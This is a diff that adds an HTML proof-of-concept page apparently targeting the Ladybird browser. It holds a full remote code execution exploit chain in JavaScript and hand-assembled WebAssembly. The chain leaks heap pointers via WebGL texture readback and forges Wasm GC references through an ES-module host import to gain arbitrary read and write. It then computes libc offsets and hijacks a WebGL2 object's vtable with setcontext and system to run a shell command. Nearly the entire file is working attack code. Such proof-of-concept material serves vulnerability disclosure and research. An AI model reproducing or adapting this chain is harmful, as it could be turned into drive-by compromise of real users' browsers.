@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>Ladybird WebAssembly ESM host function RCE PoC</title>
+<body>
+<pre id="log"></pre>
+<script>
+    (async () => {
+        const output = document.getElementById("log");
+        function log(message) {
+            const line = String(message);
+            console.log(line);
+            output.textContent += line + "\n";
+        }
+
+        const PAGE_SIZE = 65536;
+        const PAGE_COUNT = 3;
+        const TOTAL_BYTES = PAGE_SIZE * PAGE_COUNT;
+        const WIDTH = 256;
+        const HEIGHT = TOTAL_BYTES / (WIDTH * 4);
+        const READBACK_ROWS = 16;
+        const HOLDER_ELEMENT_COUNT = TOTAL_BYTES / 16;
+        const WRITE_VALUE = 0x12345678;
+        const FAKE_WRITE_VALUE = 0x41424344;
+        const TARGET_BUFFER_SIZE = 0x800;
+        const STOP_AFTER_NATIVE_WRITE = false;
+        const heapNoise = [];
+
+        async function settleHeap() {
+            for (let i = 0; i < 64; ++i)
+                heapNoise.push(new Uint8Array(0x4000));
+            if (heapNoise.length > 256)
+                heapNoise.splice(0, 128);
+            await new Promise(resolve => setTimeout(resolve, 0));
+        }
+
+        function encodeULEB128(value) {
+            const bytes = [];
+            do {
+                let byte = value & 0x7f;
+                value >>>= 7;
+                if (value !== 0)
+                    byte |= 0x80;
+                bytes.push(byte);
+            } while (value !== 0);
+            return bytes;
+        }
+
+        function encodeSLEB128BigInt(value) {
+            const bytes = [];
+            let more = true;
+            while (more) {
+                let byte = Number(value & 0x7fn);
+                value >>= 7n;
+                const signBitSet = (byte & 0x40) !== 0;
+                if ((value === 0n && !signBitSet) || (value === -1n && signBitSet))
+                    more = false;
+                else
+                    byte |= 0x80;
+                bytes.push(byte);
+            }
+            return bytes;
+        }
+
+        function encodeI32Immediate(value) {
+            let signed = BigInt(value) & 0xffffffffn;
+            if (signed >= 0x80000000n)
+                signed -= 0x100000000n;
+            return encodeSLEB128BigInt(signed);
+        }
+
+        function encodeU64LE(value) {
+            const bytes = [];
+            for (let i = 0; i < 8; ++i)
+                bytes.push(Number((value >> BigInt(8 * i)) & 0xffn));
+            return bytes;
+        }
+
+        function decodeU64LE(bytes, offset) {
+            let value = 0n;
+            for (let i = 0; i < 8; ++i)
+                value |= BigInt(bytes[offset + i]) << BigInt(8 * i);
+            return value;
+        }
+
+        function encodeU128LE(low, high) {
+            return [...encodeU64LE(low), ...encodeU64LE(high)];
+        }
+
+        function encodeString(string) {
+            const encoded = new TextEncoder().encode(string);
+            return [...encodeULEB128(encoded.length), ...encoded];
+        }
+
+        function section(id, payload) {
+            return [id, ...encodeULEB128(payload.length), ...payload];
+        }
+
+        function functionTypeRaw(params, results) {
+            return [
+                0x60,
+                ...encodeULEB128(params.length),
+                ...params.flat(),
+                ...encodeULEB128(results.length),
+                ...results.flat(),
+            ];
+        }
+
+        function functionBody(bytes, locals = []) {
+            return [...encodeULEB128(encodeULEB128(locals.length).length + locals.flat().length + bytes.length), ...encodeULEB128(locals.length), ...locals.flat(), ...bytes];
+        }
+
+        function hex64(value) {
+            return value.toString(16).padStart(16, "0");
+        }
+
+        function decodeJSObjectPointer(word) {
+            if ((word >> 48n) !== 0xfff9n)
+                return null;
+
+            let pointer = word & 0x0000ffffffffffffn;
+            if (pointer & 0x0000800000000000n)
+                pointer |= 0xffff000000000000n;
+            return pointer;
+        }
+
+        const i32 = 0x7f;
+        const v128 = 0x7b;
+        const arrayref = 0x6a;
+        const refNull = 0x63;
+        const arrayType = 0x5e;
+        const gcObjectTag = 6n;
+
+        function wasmGcSprayModule() {
+            const victimArrayType = [arrayType, i32, 0x01];
+            const holderArrayType = [arrayType, refNull, 0x00, 0x01];
+            const typeSection = section(1, [
+                0x04,
+                ...victimArrayType,
+                ...holderArrayType,
+                ...functionTypeRaw([], []),
+                ...functionTypeRaw([], [i32]),
+            ]);
+            const functionSection = section(3, [
+                0x03,
+                0x02,
+                0x02,
+                0x03,
+            ]);
+            const globalSection = section(6, [
+                0x02,
+                refNull, 0x00, 0x01,
+                0xd0, 0x00, 0x0b,
+                refNull, 0x01, 0x01,
+                0xd0, 0x01, 0x0b,
+            ]);
+            const exportSection = section(7, [
+                0x03,
+                ...encodeString("init"), 0x00, 0x00,
+                ...encodeString("spray"), 0x00, 0x01,
+                ...encodeString("read"), 0x00, 0x02,
+            ]);
+            const initBody = functionBody([
+                0x41, ...encodeSLEB128BigInt(0x11111111n),
+                0x41, 0x01,
+                0xfb, 0x06, 0x00,
+                0x24, 0x00,
+                0x0b,
+            ]);
+            const sprayBody = functionBody([
+                0x23, 0x00,
+                0x41, ...encodeSLEB128BigInt(BigInt(HOLDER_ELEMENT_COUNT)),
+                0xfb, 0x06, 0x01,
+                0x24, 0x01,
+                0x0b,
+            ]);
+            const readBody = functionBody([
+                0x23, 0x00,
+                0x41, 0x00,
+                0xfb, 0x0b, 0x00,
+                0x0b,
+            ]);
+            const codeSection = section(10, [
+                0x03,
+                ...initBody,
+                ...sprayBody,
+                ...readBody,
+            ]);
+
+            return new Uint8Array([
+                0x00, 0x61, 0x73, 0x6d,
+                0x01, 0x00, 0x00, 0x00,
+                ...typeSection,
+                ...functionSection,
+                ...globalSection,
+                ...exportSection,
+                ...codeSection,
+            ]);
+        }
+
+        function wasmGcWriterModule(moduleSpecifier, pointer, writeValue = WRITE_VALUE) {
+            const victimArrayType = [arrayType, i32, 0x01];
+            const typeSection = section(1, [
+                0x03,
+                ...victimArrayType,
+                ...functionTypeRaw([], [arrayref]),
+                ...functionTypeRaw([], []),
+            ]);
+            const importSection = section(2, [
+                0x01,
+                ...encodeString(moduleSpecifier),
+                ...encodeString("host"),
+                0x00,
+                0x01,
+            ]);
+            const functionSection = section(3, [0x01, 0x02]);
+            const startSection = section(8, [0x01]);
+            const body = functionBody([
+                ...Array.from({ length: 8 }, () => [0xfd, 0x0c, ...encodeU128LE(pointer, gcObjectTag)]).flat(),
+                0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a,
+                0x10, 0x00,
+                0xfb, 0x17, 0x00,
+                0x41, 0x00,
+                0x41, ...encodeI32Immediate(writeValue),
+                0xfb, 0x0e, 0x00,
+                0x0b,
+            ], [[0x01, v128]]);
+            const codeSection = section(10, [0x01, ...body]);
+
+            return new Uint8Array([
+                0x00, 0x61, 0x73, 0x6d,
+                0x01, 0x00, 0x00, 0x00,
+                ...typeSection,
+                ...importSection,
+                ...functionSection,
+                ...startSection,
+                ...codeSection,
+            ]);
+        }
+
+        function wasmArrayLenRead32Module(moduleSpecifier, address) {
+            const fakeBase = address - 24n;
+            const typeSection = section(1, [
+                0x02,
+                ...functionTypeRaw([], [arrayref]),
+                ...functionTypeRaw([], []),
+            ]);
+            const importSection = section(2, [
+                0x02,
+                ...encodeString(moduleSpecifier),
+                ...encodeString("host"),
+                0x00,
+                0x00,
+                ...encodeString(moduleSpecifier),
+                ...encodeString("memory"),
+                0x02,
+                0x00, 0x01,
+            ]);
+            const functionSection = section(3, [0x01, 0x01]);
+            const startSection = section(8, [0x01]);
+            const body = functionBody([
+                0x41, 0x00,
+                ...Array.from({ length: 8 }, () => [0xfd, 0x0c, ...encodeU128LE(fakeBase, gcObjectTag)]).flat(),
+                0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a,
+                0x10, 0x00,
+                0xfb, 0x0f,
+                0x36, 0x02, 0x00,
+                0x0b,
+            ], [[0x01, v128]]);
+            const codeSection = section(10, [0x01, ...body]);
+
+            return new Uint8Array([
+                0x00, 0x61, 0x73, 0x6d,
+                0x01, 0x00, 0x00, 0x00,
+                ...typeSection,
+                ...importSection,
+                ...functionSection,
+                ...startSection,
+                ...codeSection,
+            ]);
+        }
+
+        async function read32(importURL, address) {
+            const memory = new WebAssembly.Memory({ initial: 1 });
+            globalThis.__gcarrayReadMemory = memory;
+            const providerURL = URL.createObjectURL(new Blob([`
+                export const memory = globalThis.__gcarrayReadMemory;
+                export function host() {
+                    return null;
+                }
+            `], { type: "text/javascript" }));
+            const moduleURL = URL.createObjectURL(new Blob([
+                wasmArrayLenRead32Module(providerURL, address)
+            ], { type: "application/wasm" }));
+            try {
+                await import(moduleURL);
+                return BigInt(new DataView(memory.buffer).getUint32(0, true));
+            } finally {
+                URL.revokeObjectURL(moduleURL);
+                URL.revokeObjectURL(providerURL);
+            }
+        }
+
+        async function read64(importURL, address) {
+            const low = await read32(importURL, address);
+            const high = await read32(importURL, address + 4n);
+            return low | (high << 32n);
+        }
+
+        function write64(view, offset, value) {
+            view.setUint32(offset, Number(value & 0xffffffffn), true);
+            view.setUint32(offset + 4, Number((value >> 32n) & 0xffffffffn), true);
+        }
+
+        function mostFrequentPointer(pointers) {
+            const counts = new Map();
+            for (const pointer of pointers)
+                counts.set(pointer, (counts.get(pointer) || 0) + 1);
+            let best = 0n;
+            let bestCount = 0;
+            for (const [pointer, count] of counts) {
+                if (count > bestCount) {
+                    best = pointer;
+                    bestCount = count;
+                }
+            }
+            return best;
+        }
+
+        async function leakMapObjectPointers(valueObject) {
+            const memory64Bytes = new Uint8Array([
+                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+                0x05, 0x04, 0x01, 0x05, 0x03, 0x04,
+                0x07, 0x05, 0x01, 0x01, 0x6d, 0x02, 0x00,
+            ]);
+
+            const { instance } = await WebAssembly.instantiate(memory64Bytes, {});
+            const memory = instance.exports.m;
+            const original = new Uint8ClampedArray(memory.buffer, 0, TOTAL_BYTES);
+            for (let i = 0; i < original.length; i += 4) {
+                original[i + 0] = 0x44;
+                original[i + 1] = 0x55;
+                original[i + 2] = 0x66;
+                original[i + 3] = 0xff;
+            }
+
+            const imageData = new ImageData(original, WIDTH, HEIGHT);
+            const canvas = document.createElement("canvas");
+            canvas.width = WIDTH;
+            canvas.height = HEIGHT;
+            const gl = canvas.getContext("webgl2");
+            log(`gcarray map webgl2 context: ${!!gl}`);
+            if (!gl)
+                return [];
+
+            const texture = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, texture);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+            gl.pixelStorei(gl.UNPACK_ALIGNMENT, 1);
+
+            await settleHeap();
+            memory.grow(1);
+
+            const marker = valueObject || { marker: 0x5150 };
+            const mapRoots = [];
+            for (let r = 0; r < 32; ++r) {
+                const map = new Map();
+                for (let i = 0; i < 2868; ++i)
+                    map.set({ r, i }, marker);
+                mapRoots.push(map);
+            }
+            globalThis.__gcarrayMapLeakRoots = { marker, mapRoots };
+
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, imageData);
+            const framebuffer = gl.createFramebuffer();
+            gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffer);
+            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0);
+
+            const out = new Uint8Array(WIDTH * READBACK_ROWS * 4);
+            gl.readPixels(0, 0, WIDTH, READBACK_ROWS, gl.RGBA, gl.UNSIGNED_BYTE, out);
+
+            const pointers = [];
+            for (let i = 0; i + 7 < out.length; i += 8) {
+                const objectPointer = decodeJSObjectPointer(decodeU64LE(out, i));
+                if (objectPointer !== null && (objectPointer & 7n) === 0n)
+                    pointers.push(objectPointer);
+            }
+            log(`gcarray map object pointers: ${pointers.slice(0, 8).map(hex64).join(",")}`);
+            return pointers;
+        }
+
+        async function leakGcArrayPointers(spray) {
+            const memory64Bytes = new Uint8Array([
+                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+                0x05, 0x04, 0x01, 0x05, 0x03, 0x04,
+                0x07, 0x05, 0x01, 0x01, 0x6d, 0x02, 0x00,
+            ]);
+
+            const { instance } = await WebAssembly.instantiate(memory64Bytes, {});
+            const memory = instance.exports.m;
+            const original = new Uint8ClampedArray(memory.buffer, 0, TOTAL_BYTES);
+            for (let i = 0; i < original.length; i += 4) {
+                original[i + 0] = 0x11;
+                original[i + 1] = 0x22;
+                original[i + 2] = 0x33;
+                original[i + 3] = 0xff;
+            }
+
+            const imageData = new ImageData(original, WIDTH, HEIGHT);
+            const canvas = document.createElement("canvas");
+            canvas.width = WIDTH;
+            canvas.height = HEIGHT;
+            const gl = canvas.getContext("webgl2");
+            log(`gcarray webgl2 context: ${!!gl}`);
+            if (!gl)
+                return [];
+
+            const texture = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, texture);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+            gl.pixelStorei(gl.UNPACK_ALIGNMENT, 1);
+
+            await settleHeap();
+            memory.grow(1);
+            spray();
+
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, imageData);
+            const framebuffer = gl.createFramebuffer();
+            gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffer);
+            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0);
+
+            const out = new Uint8Array(WIDTH * READBACK_ROWS * 4);
+            gl.readPixels(0, 0, WIDTH, READBACK_ROWS, gl.RGBA, gl.UNSIGNED_BYTE, out);
+
+            const pointers = [];
+            for (let i = 0; i + 15 < out.length; i += 16) {
+                const low = decodeU64LE(out, i);
+                const high = decodeU64LE(out, i + 8);
+                if (high === gcObjectTag && low !== 0n && (low & 7n) === 0n)
+                    pointers.push(low);
+                if (high === 0n && low > 0x10000n && (low & 7n) === 0n)
+                    pointers.push(low);
+            }
+            const prefix = [];
+            for (let i = 0; i + 7 < Math.min(out.length, 128); i += 8)
+                prefix.push(hex64(decodeU64LE(out, i)));
+            log(`gcarray readback prefix: ${prefix.join(",")}`);
+            log(`gcarray leaked gc refs: ${pointers.slice(0, 8).map(hex64).join(",")}`);
+            return pointers;
+        }
+
+        const fakeBuffer = new ArrayBuffer(128);
+        const fakeView = new DataView(fakeBuffer);
+        const targetBuffer = new ArrayBuffer(TARGET_BUFFER_SIZE);
+        const targetView = new DataView(targetBuffer);
+        globalThis.__gcarrayFakeBuffers = { fakeBuffer, targetBuffer };
+
+        const fakeBufferPointers = await leakMapObjectPointers(fakeBuffer);
+        const fakeBufferObject = mostFrequentPointer(fakeBufferPointers);
+        if (fakeBufferObject === 0n) {
+            log("gcarray no fake buffer object pointer");
+            return;
+        }
+        log(`gcarray fake buffer object: ${hex64(fakeBufferObject)}`);
+
+        const targetBufferPointers = await leakMapObjectPointers(targetBuffer);
+        const targetBufferObject = mostFrequentPointer(targetBufferPointers);
+        if (targetBufferObject === 0n) {
+            log("gcarray no target buffer object pointer");
+            return;
+        }
+        log(`gcarray target buffer object: ${hex64(targetBufferObject)}`);
+
+        const heapHighBits = fakeBufferObject & 0xffffffff00000000n;
+        log(`gcarray heap high bits: ${hex64(heapHighBits)}`);
+
+        let sprayInstance;
+        try {
+            sprayInstance = (await WebAssembly.instantiate(wasmGcSprayModule(), {})).instance;
+            log("gcarray spray module instantiated");
+        } catch (e) {
+            log("gcarray spray instantiate failed: " + e.name + ": " + e.message);
+            return;
+        }
+
+        sprayInstance.exports.init();
+        log(`gcarray before write: ${sprayInstance.exports.read()}`);
+
+        const pointers = await leakGcArrayPointers(() => {
+            for (let i = 0; i < 24; ++i)
+                sprayInstance.exports.spray();
+        });
+
+        if (pointers.length === 0) {
+            log("gcarray no leaked wasm gc pointer");
+            return;
+        }
+        const victimPointer = heapHighBits | (pointers[0] & 0xffffffffn);
+        log(`gcarray reconstructed victim: ${hex64(victimPointer)}`);
+
+        const importURL = URL.createObjectURL(new Blob([`
+            export function host() {
+                return null;
+            }
+        `], { type: "text/javascript" }));
+        const moduleURL = URL.createObjectURL(new Blob([
+            wasmGcWriterModule(importURL, victimPointer)
+        ], { type: "application/wasm" }));
+
+        try {
+            await import(moduleURL);
+            log(`gcarray after write: ${sprayInstance.exports.read()}`);
+        } catch (e) {
+            log("gcarray writer caught: " + e.name + ": " + e.message);
+        }
+
+        URL.revokeObjectURL(moduleURL);
+
+        try {
+            const victimVtable = await read64(importURL, victimPointer);
+            const victimHeader = await read64(importURL, victimPointer + 8n);
+            const victimType = await read64(importURL, victimPointer + 16n);
+            const fakeBacking = await read64(importURL, fakeBufferObject + 64n);
+            const targetBacking = await read64(importURL, targetBufferObject + 64n);
+            log(`gcarray victim vtable: ${hex64(victimVtable)}`);
+            log(`gcarray victim header: ${hex64(victimHeader)}`);
+            log(`gcarray victim type: ${hex64(victimType)}`);
+            log(`gcarray fake backing: ${hex64(fakeBacking)}`);
+            log(`gcarray target backing: ${hex64(targetBacking)}`);
+
+            write64(fakeView, 0, victimVtable);
+            write64(fakeView, 8, victimHeader);
+            write64(fakeView, 16, victimType);
+            write64(fakeView, 24, 1n);
+            write64(fakeView, 32, 1n);
+
+            async function nativeWrite32(address, value) {
+                write64(fakeView, 40, address);
+                const writeURL = URL.createObjectURL(new Blob([
+                    wasmGcWriterModule(importURL, fakeBacking, value)
+                ], { type: "application/wasm" }));
+                try {
+                    await import(writeURL);
+                } finally {
+                    URL.revokeObjectURL(writeURL);
+                }
+            }
+
+            async function nativeWrite64(address, value) {
+                await nativeWrite32(address, Number(value & 0xffffffffn));
+                await nativeWrite32(address + 4n, Number((value >> 32n) & 0xffffffffn));
+            }
+
+            async function retargetDataView(address) {
+                await nativeWrite64(targetBufferObject + 64n, address);
+                await nativeWrite64(targetBufferObject + 72n, BigInt(TARGET_BUFFER_SIZE));
+                await nativeWrite64(targetBufferObject + 80n, BigInt(TARGET_BUFFER_SIZE));
+            }
+
+            await nativeWrite32(targetBacking, FAKE_WRITE_VALUE);
+            log(`gcarray fake write target u32: ${targetView.getUint32(0, true)}`);
+            if (STOP_AFTER_NATIVE_WRITE) {
+                URL.revokeObjectURL(importURL);
+                return;
+            }
+
+            await retargetDataView(victimPointer);
+            const dvVictimVtable = targetView.getBigUint64(0, true);
+            const dvVictimType = targetView.getBigUint64(16, true);
+            log(`gcarray dataview victim vtable: ${hex64(dvVictimVtable)}`);
+            log(`gcarray dataview victim type: ${hex64(dvVictimType)}`);
+
+            async function readU64(address) {
+                await retargetDataView(address);
+                return targetView.getBigUint64(0, true);
+            }
+
+            async function writeU64(address, value) {
+                await retargetDataView(address);
+                targetView.setBigUint64(0, value, true);
+            }
+
+            const wasmBase = victimVtable - (0x59ba60n + 0x10n);
+            const libcCxaFinalize = await readU64(wasmBase + 0x59d300n);
+            const libcBase = libcCxaFinalize - 0x472c0n;
+            const libcSetcontext = libcBase + 0x4a960n;
+            const libcSystem = libcBase + 0x58750n;
+            const libcExit = libcBase + 0x47ba0n;
+            const libcPopRdi = libcBase + 0x10f78bn;
+            log(`gcarray wasm base: ${hex64(wasmBase)}`);
+            log(`gcarray libc cxa finalize: ${hex64(libcCxaFinalize)}`);
+            log(`gcarray libc base: ${hex64(libcBase)}`);
+
+            const commandAddress = targetBacking;
+            const fakeVtableBase = targetBacking + 0x100n;
+            const fakeVptr = fakeVtableBase + 0x20n;
+            const fpState = targetBacking + 0x580n;
+            const scratchStack = targetBacking + 0x708n;
+            const commandBytes = new TextEncoder().encode("touch /tmp/ladybird_wasm_esm_rce\0");
+
+            await retargetDataView(targetBacking);
+            for (let i = 0; i < commandBytes.length; ++i)
+                targetView.setUint8(i, commandBytes[i]);
+
+            await retargetDataView(fakeVtableBase);
+            for (let i = 0; i < 0x400 / 8; ++i)
+                targetView.setBigUint64(i * 8, libcSetcontext, true);
+            targetView.setBigUint64(Number(scratchStack - fakeVtableBase), libcPopRdi, true);
+            targetView.setBigUint64(Number(scratchStack - fakeVtableBase + 8n), 0n, true);
+            targetView.setBigUint64(Number(scratchStack - fakeVtableBase + 16n), libcExit, true);
+
+            const triggerCanvas = document.createElement("canvas");
+            const triggerObjectValue = triggerCanvas.getContext("webgl2");
+            if (!triggerObjectValue) {
+                log("gcarray rce no webgl2 trigger object");
+            } else {
+                const triggerPointers = await leakMapObjectPointers(triggerObjectValue);
+                const triggerObject = mostFrequentPointer(triggerPointers);
+                log(`gcarray trigger object: ${hex64(triggerObject)}`);
+                if (triggerObject !== 0n) {
+                    await retargetDataView(triggerObject);
+                    targetView.setBigUint64(0x00, fakeVptr, true);
+                    targetView.setBigUint64(0x68, commandAddress, true);
+                    targetView.setBigUint64(0xa0, scratchStack, true);
+                    targetView.setBigUint64(0xa8, libcSystem, true);
+                    targetView.setBigUint64(0xe0, fpState, true);
+                    targetView.setUint32(0x1c0, 0x1f80, true);
+                    targetView.setUint32(0x128, 0, true);
+                    targetView.setUint32(0x12c, 0, true);
+                    log("gcarray rce trigger");
+                    triggerObjectValue.getError();
+                    log("gcarray rce returned");
+                }
+            }
+        } catch (e) {
+            log("gcarray fake write caught: " + e.name + ": " + e.message);
+        }
+
+        URL.revokeObjectURL(importURL);
+        log("gcarray finished");
+    })().catch(e => {
+        const output = document.getElementById("log");
+        const line = "gcarray top-level error: " + e.name + ": " + e.message;
+        console.log(line);
+        output.textContent += line + "\n";
+    });
+</script>
+</body>
